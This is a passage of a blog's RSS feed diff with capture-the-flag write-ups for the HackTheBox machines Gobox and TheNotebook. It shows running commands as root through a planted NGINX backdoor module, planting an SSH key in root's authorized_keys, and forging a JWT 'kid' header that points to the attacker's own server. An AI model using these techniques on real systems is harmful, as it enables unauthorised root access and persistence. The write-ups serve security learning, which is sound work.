+
+PORT     STATE SERVICE VERSION
+4566/tcp open  http    nginx
+<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.35 seconds
+</code></pre></div><p>Since I know the correct authorization value, I can add it to the authorization header and get access to port 4566.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
+$ curl -sv http://10.10.11.113:4566/ -H <span class="s1">&#39;Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbm
+</span><span class="s1">dFc3BvcnRz&#39;</span>
+*   Trying 10.10.11.113:4566...
+* Connected to 10.10.11.113 <span class="o">(</span>10.10.11.113<span class="o">)</span> port <span class="m">4566</span> <span class="o">(</span><span class="c1">#0)</span>
+&gt; GET / HTTP/1.1
+&gt; Host: 10.10.11.113:4566
+&gt; User-Agent: curl/7.74.0
+&gt; Accept: */*
+&gt; Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
+&gt;
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 <span class="m">404</span>
+&lt; Server: nginx
+&lt; Date: Thu, <span class="m">09</span> Sep <span class="m">2021</span> 07:33:54 GMT
+&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+&lt; Content-Length: <span class="m">21</span>
+&lt; Connection: keep-alive
+&lt; access-control-allow-origin: *
+&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
+&lt; access-control-allow-headers: authorization,content-type,content-length,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging,amz-sdk-invocation-id,amz-sdk-request
+&lt; access-control-expose-headers: x-amz-version-id
+&lt;
+* Connection <span class="c1">#0 to host 10.10.11.113 left intact</span>
+<span class="o">{</span><span class="s2">&#34;status&#34;</span>: <span class="s2">&#34;running&#34;</span><span class="o">}</span>
+</code></pre></div><p>As for port 80 and 8080, it&rsquo;s clear that they are the homepage and the login page site.</p>
+<p>The next one is request routing for port 8000, this is my first time to see &ldquo;command on&rdquo; written on NGINX&rsquo;s config file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="k">server</span> <span class="p">{</span>
+        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
+        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
+                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div><p>When I try to interact with it, it returns nothing.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ curl -s http://127.0.0.1:8000
+www-data@gobox:/opt$ curl -I http://127.0.0.1:8000
+curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
+</code></pre></div><p>With <code>nc</code>, it returns a &ldquo;Bad Request&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/$ nc -vn 127.0.0.1 <span class="m">8000</span>
+Connection to 127.0.0.1 <span class="m">8000</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
+/
+HTTP/1.1 <span class="m">400</span> Bad Request
+Server: nginx
+Date: Wed, <span class="m">08</span> Sep <span class="m">2021</span> 11:13:48 GMT
+Content-Type: text/html
+Content-Length: <span class="m">150</span>
+Connection: close
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</code></pre></div><p>If I look at the date modified of the NGINX folder, there are 6 folders that were modified on August 26 at the same time.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ ls -lt
+total <span class="m">64</span>
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snippets
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-available
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-enabled
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-enabled
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 conf.d
+drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-available
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1484</span> Aug <span class="m">24</span> 20:30 nginx.conf
+-rw-r--r-- <span class="m">1</span> root root <span class="m">3071</span> Feb  <span class="m">4</span>  <span class="m">2019</span> win-utf
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1077</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi.conf
+-rw-r--r-- <span class="m">1</span> root root <span class="m">1007</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi_params
+-rw-r--r-- <span class="m">1</span> root root <span class="m">2837</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-utf
+-rw-r--r-- <span class="m">1</span> root root <span class="m">2223</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-win
+-rw-r--r-- <span class="m">1</span> root root <span class="m">3957</span> Feb  <span class="m">4</span>  <span class="m">2019</span> mime.types
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">180</span> Feb  <span class="m">4</span>  <span class="m">2019</span> proxy_params
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">636</span> Feb  <span class="m">4</span>  <span class="m">2019</span> scgi_params
+-rw-r--r-- <span class="m">1</span> root root  <span class="m">664</span> Feb  <span class="m">4</span>  <span class="m">2019</span> uwsgi_params
+</code></pre></div><p>When I visit the <code>modules-enabled</code> folder, I find a module with a suspicious name &ldquo;backdoor&rdquo;!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ ls -l modules-enabled
+total <span class="m">12</span>
+-rw-r--r-- <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 20:50 50-backdoor.conf
+lrwxrwxrwx <span class="m">1</span> root root <span class="m">61</span> Aug <span class="m">23</span> 14:43 50-mod-http-image-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-image-filter.conf
+lrwxrwxrwx <span class="m">1</span> root root <span class="m">60</span> Aug <span class="m">23</span> 14:43 50-mod-http-xslt-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
+lrwxrwxrwx <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 14:43 50-mod-mail.conf -&gt; /usr/share/nginx/modules-available/mod-mail.conf
+lrwxrwxrwx <span class="m">1</span> root root <span class="m">50</span> Aug <span class="m">23</span> 14:43 50-mod-stream.conf -&gt; /usr/share/nginx/modules-available/mod-stream.conf
+</code></pre></div><p>The module loads a <code>.so</code> file called <code>ngx_http_execute_module.so</code>. I found that file under <code>/usr/lib/nginx/modules/</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ cat modules-enabled/50-backdoor.conf
+load_module modules/ngx_http_execute_module.so
+www-data@gobox:/etc/nginx$ find / -type f -name <span class="s2">&#34;ngx_http_execute_module.so&#34;</span> 2&gt;/dev/null
+/usr/lib/nginx/modules/ngx_http_execute_module.so
+www-data@gobox:/etc/nginx$ file /usr/lib/nginx/modules/ngx_http_execute_module.so
+/usr/lib/nginx/modules/ngx_http_execute_module.so: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, BuildID<span class="o">[</span>sha1<span class="o">]=</span>4279ae42bf642b21378aa43c06b52f4d0b89f2ad, with debug_info, not stripped
+</code></pre></div><p>I&rsquo;m trying to find the origin of this module by grabbing some readable code using  <code>strings</code>. It turns out the backdoor is taken from this Github repository: <a href="https://github.com/limithit/NginxExecute">NginxExecute</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.97»
+$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;.c$&#39;</span>
+ngx_pcalloc
+__ctype_b_loc
+realloc
+malloc
+ngxexecute_strncpy_alloc
+ngxexecute_strcpy_alloc
+~iHc
+/home/ubuntu/NginxExecute//ngx_result.c
+7src
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h4 id="nginx-backdoor">NGINX Backdoor</h4>
+<p>According to the README file from the repository, I just need to send a HTTP request with <code>?system.run[command]</code>, but it doesn&rsquo;t work here.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ curl -v <span class="s2">&#34;http://127.0.0.1:8000/?system.run[whoami]&#34;</span>
+* Trying 127.0.0.1:8000...
+* TCP_NODELAY <span class="nb">set</span>
+* Connected to 127.0.0.1 <span class="o">(</span>127.0.0.1<span class="o">)</span> port <span class="m">8000</span> <span class="o">(</span><span class="c1">#0)</span>
+&gt; GET /?system.run<span class="o">[</span>ifconfig<span class="o">]</span> HTTP/1.1
+&gt; Host: 127.0.0.1:8000
+&gt; User-Agent: curl/7.68.0
+&gt; Accept: */*
+&gt;
+* Empty reply from server
+* Connection <span class="c1">#0 to host 127.0.0.1 left intact</span>
+curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
+</code></pre></div><p>Running another <code>strings</code> command against the backdoor reveals it uses <code>ippsec.run</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.97»
+$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;run&#39;</span>
+ippsec.run
+</code></pre></div><p>Now if I send <code>?ippsec.run[whoami]</code>, it returns:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[whoami]&#34;</span>
+root
+</code></pre></div><p>Using the previous reverse shell script I dropped on <code>/tmp/</code>, I can get an interactive shell access as root, but then the shell gets exited by itself.</p>
+<p><div class="img-container"><img src="imgs/image-20210908184311943.png" alt="image-20210908184311943"  /></div>
+</p>
+<p>So instead, I will inject my SSH public key.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39;</span> &gt; /tmp/iamf
+www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[cat /tmp/iamf | tee /root/.ssh/authorized_keys]&#34;</span>
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H
+</code></pre></div><p>Now I can SSH login as root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
+$ ssh root@10.10.11.113
+Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-81-generic x86_64<span class="o">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed <span class="m">08</span> Sep <span class="m">2021</span> 11:52:18 AM UTC
+
+  System load:                      0.0
+  Usage of /:                       37.1% of 9.72GB
+  Memory usage:                     20%
+  Swap usage:                       0%
+  Processes:                        <span class="m">244</span>
+  Users logged in:                  <span class="m">0</span>
+  IPv4 address <span class="k">for</span> br-bb21b8b9b286: 172.28.0.1
+  IPv4 address <span class="k">for</span> docker0:         172.17.0.1
+  IPv4 address <span class="k">for</span> ens160:          10.10.11.113
+
+
+<span class="m">0</span> updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check <span class="k">for</span> new updates run: sudo apt update
+
+Last login: Thu Aug <span class="m">26</span> 23:56:12 <span class="m">2021</span>
+root@gobox:~#
+</code></pre></div><p>I can grab the root flag as well.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# ls -l
+total <span class="m">12</span>
+-rwxr-xr-x <span class="m">1</span> root root  <span class="m">536</span> Aug <span class="m">24</span> 20:33 iptables.sh
+-rw------- <span class="m">1</span> root root   <span class="m">33</span> Aug <span class="m">26</span> 21:10 root.txt
+drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snap
+root@gobox:~# cat root.txt
+81d35...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h2 id="explore">Explore</h2>
+<h3 id="undetected-ports">Undetected ports</h3>
+<p>During enumeration, when I printed the networking status, I noticed that ports 9000, 9001, and 4566 should be accessible from external, with the exception that port 4566 needs an authentication header set first to be accessible.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ netstat -tlpn
+<span class="o">(</span>Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.<span class="o">)</span>
+Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
+tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
+</code></pre></div><p>It turns out there is a set of <code>iptables</code> rules which drop any connection coming to these ports.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# iptables -L
+Chain INPUT <span class="o">(</span>policy ACCEPT<span class="o">)</span>
+target     prot opt <span class="nb">source</span>               destination         
+ACCEPT     all  --  localhost/8          anywhere            
+ACCEPT     all  --  172.16.0.0/12        anywhere            
+DROP       tcp  --  anywhere             anywhere             tcp dpt:9002
+DROP       tcp  --  anywhere             anywhere             tcp dpt:9001
+DROP       tcp  --  anywhere             anywhere             tcp dpt:9000
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><p><em>Shouldn&rsquo;t it then return with <code>filtered</code> status?</em></p>
+<p>Well, I think it was purely my mistake. I used <code>--min-rate=10000</code>, so this could be the reason <code>nmap</code> misidentified the filtered port as closed.</p>
+<h3 id="gobox-request-routing">Gobox Request Routing</h3>
+<p>The first time I looked into the NGINX configuration file, it didn&rsquo;t make sense to me why my web shell is on the host OS? In fact, I uploaded my web shell to an S3 bucket, which is also a container.</p>
+<p>Now, with root access obtained, I could understand what was happening, and there was a synchronization process between the host and the LocalStack container.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# cat /var/spool/incron/root 
+/opt/deploy/.localstack/data/recorded_api_calls.json    IN_MODIFY       /usr/bin/aws --endpoint-url http://127.0.0.1:9000 s3 sync s3://website /opt/website
+/home/ubuntu/user.txt   IN_MODIFY       cp /home/ubuntu/user.txt /var/www/
+</code></pre></div><p>So if I upload something into the bucket, the host will have it as well.</p>
+<p>I also looked at how the web routing is done in this box and eventually visualize it as shown below:</p>
+<p><div class="img-container"><img src="imgs/image-20210912193743912.png" alt="image-20210912193743912"  /></div>
+</p>
+<h2 id="references">Reference(s)</h2>
+<ul>
+<li><a href="https://www.onsecurity.io/blog/go-ssti-method-research/">https://www.onsecurity.io/blog/go-ssti-method-research/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Gobox</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-gobox/</link>
       <pubDate>Sun, 12 Sep 2021 12:33:46 +0700</pubDate>
       
@@ -566,6 +1124,365 @@ DROP       tcp  --  anywhere             anywhere             tcp dpt:9000
     
     <item>
       <title>HackTheBox - TheNotebook</title>
+      <link>https://fahmifj.github.io/hackthebox/thenotebook/</link>
+      <pubDate>Sat, 07 Aug 2021 21:07:15 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/thenotebook/</guid>
+      <description>Abusing JWT key identifier and breaking out of a Docker container</description>
+      <content:encoded><![CDATA[<p>TheNotebook from Hack The Box hosts a web-based note application and it uses a JWT token for its authentication cookie. The token can be forged to escalate myself to admin. With admin-level access, it is possible to drop a PHP web shell using the upload functionality, resulting in shell access to the system. Enumerating on the system discovers a backup file that contains SSH keys of a user. The user is allowed run a Docker container with <code>sudo</code> permissions. The Docker version in this machine is vulnerable to CVE-2019-5736. Along with the <code>sudo</code> permissions, the Docker vulnerability can be exploited to gain root access.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>JWT Key ID</li>
+<li>Docker breakout using CVE-2019-573</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li><a href="https://jwt.io">https://jwt.io</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full TCP scan discovers two open ports, SSH on port 22 and a NGINX web server on port 80.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ fscan 10.10.10.230 thenotebook
+nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> 10.10.10.230 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+nmap -p22,80,10010 -sC -sV -oA nmap/10-tcp-allport-thenotebook 10.10.10.230
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-07 02:29 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.230
+Host is up <span class="o">(</span>0.10s latency<span class="o">)</span>.
+
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">2048</span> 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open     http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: The Notebook - Your Note Keeper
+10010/tcp filtered rxapi
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.67 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>On port 80, the machine hosts a web application called &ldquo;The Notebook&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20210807133719995.png" alt="image-20210807133719995"  /></div>
+</p>
+<p>I tried some default credentials on the login page, but no luck, so I will just register an account.</p>
+<p><div class="img-container"><img src="imgs/image-20210807134833301.png" alt="image-20210807134833301"  /></div>
+</p>
+<p>And the site automatically logs me in.</p>
+<p><div class="img-container"><img src="imgs/image-20210807135132964.png" alt="image-20210807135132964"  /></div>
+</p>
+<p>I can create a note on <code>/notes</code>. I will setup a Python web server and I add a note that contains my HTB IP. Unfortunately, there is no incoming request on my web server.</p>
+<p><div class="img-container"><img src="imgs/image-20210807135517614.png" alt="image-20210807135517614"  /></div>
+</p>
+<p>My note has link of <code>10.10.10.230/f5379278-9969-4a8e-8fa5-969ec9ebf525/notes/8</code>. Because the second path looks like a GUID which is unique, so I think the attack is not an IDOR.</p>
+<p>Although, I said it&rsquo;s not an IDOR, I have a cool trick to share:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ curl -sI 10.10.10.230/f5379278-9969-4a8e-8fa5-969ec9ebf525/notes/<span class="o">{</span>7..8<span class="o">}</span>
+HTTP/1.1 <span class="m">401</span> UNAUTHORIZED
+Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Date: Sat, <span class="m">07</span> Aug <span class="m">2021</span> 07:07:48 GMT
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+Content-Length: <span class="m">12</span>
+Connection: keep-alive
+
+HTTP/1.1 <span class="m">200</span> OK
+Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Date: Sat, <span class="m">07</span> Aug <span class="m">2021</span> 07:07:49 GMT
+Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
+Content-Length: <span class="m">1710</span>
+Connection: keep-alive
+</code></pre></div><h4 id="gobuster">Gobuster</h4>
+<p>Running a <code>gobuster</code> scan reveals that there is an admin page (<code>/admin</code>), but I have no access there.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17» 
+$ gobuster dir -u http://10.10.10.230/ -w /opt/SecLists/Discovery/Web-Content/common.txt -x txt -o gobuster/gobuster-S-80 -t <span class="nv">40</span> 
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.10.230/
+<span class="o">[</span>+<span class="o">]</span> Method:                  GET
+<span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">40</span>
+<span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/common.txt
+<span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+<span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
+<span class="o">[</span>+<span class="o">]</span> Extensions:              txt
+<span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+<span class="o">===============================================================</span>
+2021/08/07 02:44:26 Starting gobuster in directory enumeration <span class="nv">mode</span>
+<span class="o">===============================================================</span>
+/admin                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 9<span class="o">]</span>
+/login                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1250<span class="o">]</span>
+/logout               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 209<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.10.230/<span class="o">]</span>
+/register             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1422<span class="o">]</span>                          
+                                                                          
+<span class="o">===============================================================</span>
+2021/08/07 02:44:49 <span class="nv">Finished</span>
+<span class="o">===============================================================</span>
+</code></pre></div><h4 id="playing-with-jwt-cookie">Playing with JWT Cookie</h4>
+<p>While inspecting the browser storage, I find the site generates two cookie:  <code>auth</code> and <code>uuid</code>. The <code>auth</code> cookie is a JWT token.</p>
+<p><div class="img-container"><img src="imgs/image-20210807141947185.png" alt="image-20210807141947185"  /></div>
+</p>
+<blockquote>
+<p>Note: JWT token consists of header, payload, and signature that are separated by a dot and each part is encoded with base64.</p>
+</blockquote>
+<p>The <code>auth</code> cookie can decoded using <a href="https://jwt.io/">jwt.io</a>.</p>
+<p><div class="img-container"><img src="imgs/image-20210807143329934.png" alt="image-20210807143329934"  /></div>
+</p>
+<p>The value of <code>kid</code> (key identifier) and <code>admin_cap</code> are interesting vectors to play with. First, I will grab the header value and decode it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17»
+$ <span class="nb">echo</span> <span class="s1">&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9&#39;</span> <span class="p">|</span> base64 -d
+<span class="o">{</span><span class="s2">&#34;typ&#34;</span>:<span class="s2">&#34;JWT&#34;</span>,<span class="s2">&#34;alg&#34;</span>:<span class="s2">&#34;RS256&#34;</span>,<span class="s2">&#34;kid&#34;</span>:<span class="s2">&#34;http://localhost:7070/privKey.key&#34;</span><span class="o">}</span>
+</code></pre></div><p>I can try to modify the <code>kid</code> value to point to my IP, then I will encode the header back to base64.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «thenotebook» «10.10.14.17»
+$ <span class="nb">echo</span> -n <span class="s1">&#39;{&#34;typ&#34;:&#34;JWT&#34;,&#34;alg&#34;:&#34;RS256&#34;,&#34;kid&#34;:&#34;http://10.10.14.17/privKey.key&#34;}&#39;</span> <span class="p">|</span> base64 -w0
+eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xNy9wcml2S2V5LmtleSJ9
+</code></pre></div><p>I will put back the forged header to the <code>auth</code> cookie and setup a Python web server afterwards.</p>
+<p>When I refresh the page, there is an incoming request for <code>privKey.key</code> to my web server.</p>
+<p><div class="img-container"><img src="imgs/image-20210807151313793.png" alt="image-20210807151313793"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="escalate-to-web-admin">Escalate to web admin</h4>
+<p>Since the  <code>kid</code>  value can be controlled by me, I can forge a token that has <code>admin_cap</code>  value set to <code>true</code> and so the app will look for my private key and eventually validates my forged token using that key.</p>
+<p>First, I will create <code>privKey.key</code> using <code>ssh-keygen</code>. I will host this key using Python web server.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.17» 
+$ ssh-keygen -t rsa -P <span class="s2">&#34;&#34;</span> -b <span class="m">4096</span> -m PEM -f privKey.key
+Generating public/private rsa key pair.
+Your identification has been saved in privKey.key
+Your public key has been saved in privKey.key.pub
+The key fingerprint is:
+SHA256:IWMd7YYOw6gQT2tpGCtbx3Iaav2yW1qs8lyYGVl90fo kali@kali
+The key<span class="err">&#39;</span>s randomart image is:
++---<span class="o">[</span>RSA 4096<span class="o">]</span>----+
+<span class="p">|</span>        .o.      <span class="p">|</span>
+<span class="p">|</span>o .   .. .o.     <span class="p">|</span>
+<span class="p">|</span> B + ++.o+.      <span class="p">|</span>
+<span class="p">|</span><span class="o">=</span> X B.+oooo      <span class="p">|</span>
+<span class="p">|</span>.B.X   +S..      <span class="p">|</span>
+<span class="p">|</span>o.o.*   .  E     <span class="p">|</span>
+<span class="p">|</span>.  +.<span class="o">=</span>           <span class="p">|</span>
+<span class="p">|</span> ...*.           <span class="p">|</span>
+<span class="p">|</span>  oB+            <span class="p">|</span>
